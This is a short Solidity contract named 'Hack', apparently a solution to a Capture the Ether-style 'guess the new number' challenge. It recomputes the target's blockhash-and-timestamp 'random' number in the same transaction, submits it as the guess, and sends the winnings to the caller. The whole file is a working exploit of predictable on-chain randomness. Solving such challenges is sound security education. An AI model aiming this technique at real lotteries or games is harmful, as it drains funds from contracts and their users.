/**
 *Submitted for verification at Etherscan.io on 2022-04-04
*/

pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function isComplete() external returns (bool);
    function guess(uint8 n) external payable;
}

contract Hack {
    address public otherAddr = 0x027406f738f7Dd6E78E1727510a7EAF9b0FAFC30;
    function Hack() public {
    }

    function checkComp() public view returns (bool){
        return GuessTheNewNumberChallenge(otherAddr).isComplete();
    }

    function GetNum() public view returns (uint8){
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        return answer;
    }

    function GuessOther(address addr) public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge(addr).guess.value(msg.value)(answer);
        msg.sender.transfer(address(this).balance);
    }

    
}